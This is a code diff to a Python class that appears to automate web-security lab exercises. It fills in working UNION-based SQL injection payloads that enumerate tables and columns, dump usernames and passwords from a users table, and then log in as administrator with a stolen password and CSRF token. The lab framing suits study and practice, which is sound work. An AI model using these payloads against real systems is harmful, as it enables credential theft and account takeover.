@@ -23,13 +23,14 @@ class SQLInjectionBaseSolver(ABC):
         self.username = 'administrator'
         self.categories = []
         self.categories_url = []
+        self.body_form = {}
 
         self.total_columns = None
-        self.data_type_columns = []
         self.dbms = None
         self.db_name = None
         self.table_name = None
-        self.column_name = None
+        self.column_name = []
+        self.list_users = {}
 
         cls_json_payload = JSONPayloadSQLInjection()
         self.json_payload = cls_json_payload.get_list_dbms()
@@ -46,7 +47,7 @@ class SQLInjectionBaseSolver(ABC):
         request = RequestLab(url)
         
         if method == 'GET':
-            request.request_get()
+            request.request_get(cookies=cookies)
             self.html_content = request.get_html_content()
         elif method == 'POST':
             request.request_post(data=data, cookies=cookies, allow_redirects=allow_redirects)
@@ -130,28 +131,89 @@ class SQLInjectionBaseSolver(ABC):
                 self.console.log(f"[bold blue]DB Version:[/bold blue] {td.text}")
                 return
 
-    def retrieve_DB_name(self):
-        """Retrieve the DB name."""
-        pass
-
     def retrieve_table_name(self):
         """Retrieve the table name."""
-        pass
+        self.spinner.start()
+        self.spinner.text = 'Retrieve the Table name'
+        null = 'NULL,' * (self.total_columns-1)
+        if self.dbms == 'ORACLE':
+            payload = f"' UNION SELECT {null}table_name FROM all_tables-- -"
+        else:
+            payload = f"' UNION SELECT {null}table_name FROM information_schema.tables-- -"
+        url_brute = self.url + self.categories_url[1] + payload
+        self._request_lab('GET', url_brute)
+        td_html = self.soup_html.find_all('td')
+        for td in td_html:
+            if 'users' in td.text or 'USERS' in td.text:
+                self.spinner.stop()
+                self.table_name = td.text
+                self.console.log(f"[bold blue]Table Name:[/bold blue] {self.table_name}")
+                return
 
     def retrieve_column_name(self):
         """Retrieve the column name."""
-        pass
+        self.spinner.start()
+        self.spinner.text = 'Retrieve the Column name'
+        null = 'NULL,' * (self.total_columns-1)
+        if self.dbms == 'ORACLE':
+            payload = f"' UNION SELECT {null}column_name FROM all_tab_columns WHERE table_name='{self.table_name}'-- -"
+        else:
+            payload = f"' UNION SELECT {null}column_name FROM information_schema.columns WHERE table_name='{self.table_name}'-- -"
+        url_brute = self.url + self.categories_url[1] + payload
+        self._request_lab('GET', url_brute)
+        td_html = self.soup_html.find_all('td')
+        for td in td_html:
+            if 'username' in td.text or 'USERNAME' in td.text or 'password' in td.text or 'PASSWORD' in td.text or 'email' in td.text or 'EMAIL' in td.text:
+                self.column_name.append(td.text)
+        self.spinner.stop()
+        self._print_table(f"\nColumns of {self.table_name}", ["Column Name"], zip(self.column_name))
+        
     
     def retrieve_data(self):
         """Retrieve the data."""
-        pass
+        self.spinner.start()
+        self.spinner.text = 'Retrieve the Data'
+        null = 'NULL,' * (self.total_columns-2)
+        for column in self.column_name:
+            if 'username' in column or 'USERNAME' in column:
+                self.column_name[1] = column
+            elif 'password' in column or 'PASSWORD' in column:
+                self.column_name[2] = column
+        payload = f"' UNION SELECT {null}{self.column_name[1]},{self.column_name[2]} FROM {self.table_name}-- -"
+        url_brute = self.url + self.categories_url[1] + payload
+        self._request_lab('GET', url_brute)
+        td_html = self.soup_html.find_all('td')
+        th_html = self.soup_html.find_all('th')
+        username = []
+        password = []
+        for th in th_html:
+            if ' ' in th.text:
+                continue
+            username.append(th.text)
+        for td in td_html:
+            if ' ' in td.text:
+                continue
+            password.append(td.text)
+        self.spinner.stop()
+        self.list_users = dict(zip(username, password))
+        self._print_table(f"\nData of {self.table_name}", ["Username", "Password"], zip(username, password))
 
-    def request_login(self, body_form):
+    def request_login(self, allow_redirects=True):
         """Request the login."""
+        self.spinner.start()
+        self.spinner.text = 'Request Login Page'
         self.url = self.url + '/login'
+        self._request_lab('GET')
         self.set_csrf()
-        self._request_lab('POST', data=body_form, cookies=self.cookies, allow_redirects=False)
+        self.set_cookies()
+        self.body_form['csrf'] = self.csrf
+        self.body_form['username'] = self.username
+        self.body_form['password'] = self.list_users[self.username]
+        self._request_lab('POST', data=self.body_form, cookies=self.cookies, allow_redirects=allow_redirects)
+        self.spinner.stop()
         self.print_session()
+        path = 'my-account?id=administrator'
+        self._request_lab('GET', url=self.url+'/'+path, cookies=self.cookies)
 
     def set_csrf(self):
         """Parse the CSRF."""
